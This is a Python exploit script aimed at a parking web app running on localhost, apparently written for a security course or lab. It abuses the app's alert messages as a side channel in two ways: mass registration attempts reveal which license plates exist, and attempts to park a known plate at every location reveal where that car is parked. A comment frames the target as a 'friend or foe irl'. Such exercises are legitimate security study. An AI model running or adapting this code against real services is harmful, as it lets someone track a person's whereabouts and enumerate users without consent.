import requests
from bs4 import BeautifulSoup

def getLoggedInSession(url, username, password, route):
    """
    Function to get a session object for the given URL.
    """
    session = requests.Session()
    login_url = url + route
    payload = {
        "username": username,
        "password": password
    }
    # Perform a POST request to the login URL with the payload
    response = session.post(login_url, data=payload)
    
    # Check if the login was successful
    if response.status_code == 200:
        print("Login successful!")
    else:
        print("Login failed!")
        return None
    
    # Return the session object
    return session

def getLocations(session, url, route):
    """
    Function to get a list of locations.
    """

    # Construct the URL for the locations
    locations_url = url + route

    # Perform a GET request to the locations URL (standard homepage)
    response = session.get(locations_url)

    # Check if the request was successful
    if response.status_code == 200:
        print("Locations retrieved successfully!")
    else:
        print("Failed to retrieve locations!")
        return None

    # Extract location list using BeautifulSoup
    soup = BeautifulSoup(response.content, 'html.parser')
    locations = []

    # Find all location elements (assuming they are options in a select element)
    location_elements = soup.find_all('option')
    for location in location_elements:
        # Extract the value and text from each option
        value = location.get('value')
        text = location.text.strip()
        locations.append((value, text))

    # Return the list of locations
    return locations

def getAlertMessage(response):
    """
    Function to get the alert message from the response.
    """
    # Extract alert message using BeautifulSoup
    soup = BeautifulSoup(response.content, 'html.parser')
    alert = soup.find('div', class_='alert')

    # Check if the alert element is found
    if not alert:
        return None

    # Extract the alert message text
    alert_message = alert.text.strip()

    # Check if the alert message is empty
    if not alert_message:
        return None
    
    return alert_message

def unparkCars(session, url, route):
    """
    Function to unpark all cars.
    """
    # Construct the URL for the locations
    locations_url = url + route

    # Perform a GET request to the locations URL (standard homepage)
    response = session.get(locations_url)

    # Extract list of unparking urls using BeautifulSoup
    # We grab a list of hrefs from <a> tags with the text "Unpark"
    soup = BeautifulSoup(response.content, 'html.parser')
    parked_cars = []
    unpark_elements = soup.find_all('a', string='Unpark')
    for unpark_element in unpark_elements:
        # Extract the href from each <a> tag
        href = unpark_element.get('href')
        if href:
            parked_cars.append(href)

    # Unpark each car
    for parked_car in parked_cars:
        # The href is a relative URL, so we need to construct the full URL
        unpark_url = url + parked_car

        # Perform a GET request to unpark the car
        response = session.get(unpark_url)

        # Assume we succeeded

    return

    
def getCarLocationIfParked(session, url, plate, route):
    """
    Function to get the location of a car if it is parked.
    """
    # List of all available locations
    locations = getLocations(session, url, "/")

    # Construct the URL for the car's location
    car_location_url = url + route
    # Perform post trying to park the car
    payload = {
        "licensePlate": plate,
        "mintime": 60
    }

    car_locations = []

    # For each location, try to park the car
    for location in locations:
        location_id, location_name = location
        payload["location"] = location_id
        
        # Perform a POST request to the car location URL with the payload
        response = session.post(car_location_url, data=payload)

        # Check if the request fails
        alertMsg = getAlertMessage(response)
        
        # If alert message is not None, save the location
        if alertMsg is not None:
            # Extract the location name from the alert message
            car_locations.append((location_name))
        
    # Unpark all cars
    unparkCars(session, url, "/")

    return car_locations

def tryToRegister(url, username, password, route, license_plate):
    """
    Function to try to register an account
    """

    # Construct the URL for the registration
    registration_url = url + route

    # Perform a POST request to the registration URL with the payload
    payload = {
        "username": username,
        "password": password,
        "password2": password + "2", # Different password to fail registration, when license plate is unique
        "plate": license_plate
    }

    response = requests.post(registration_url, data=payload)

    alert_msg = getAlertMessage(response)
    
    if alert_msg is not None:
        return alert_msg
    else:
        return None

def exploitRegistration():
    username = "mal" # Malicious user we know doesn't exist in the system
    password = "malicious1"
    url = "http://localhost:3000"

    # List of license plates to try
    license_plates = [
        "ABC123",  
        "ABC124",  # Friend's plate
        "ABC125",  
        "ABC126",  
        "ABC127", 
        "ABC128",
        "ABC129",  
        "ABC130",
    ]

    license_plates_that_exist = []

    for license_plate in license_plates:
        # Try to register the malicious user with the license plate
        alert_msg = tryToRegister(url, username, password, "/signup", license_plate)

        if alert_msg is not None:
            # Check if the alert message indicates that the license plate already exists
            if "license plate" in alert_msg.lower():
                # If it does, add the license plate to the list of existing plates
                license_plates_that_exist.append(license_plate)

    # Print the license plates that exist
    if license_plates_that_exist:
        print("The following license plates exist in the system:")
        for plate in license_plates_that_exist:
            print(f"License Plate: {plate}")
    else:
        print("No license plates exist in the system.")

def exploitParking():
    url = "http://localhost:3000"
    username = "hello"
    password = "test1"

    session = getLoggedInSession(url, username, password, "/login")

    # We know a licence plate (friend or foe irl) and want to figure out where he is
    locations = getCarLocationIfParked(session, url, "ABC124", "/park")

    # Print the locations
    if locations:
        print("Car parked at the following locations:")
        for location in locations:
            print(f"Location: {location}")
    else:
        print("Car not parked at any location.")

def main():
    # Exploit the parking system to extract infomation (Storage Side Channel Attack)
    # exploitParking()

    # Exploit the registration system to extract infomation (Storage Side Channel Attack)
    exploitRegistration()

if __name__ == "__main__":
    main()
    
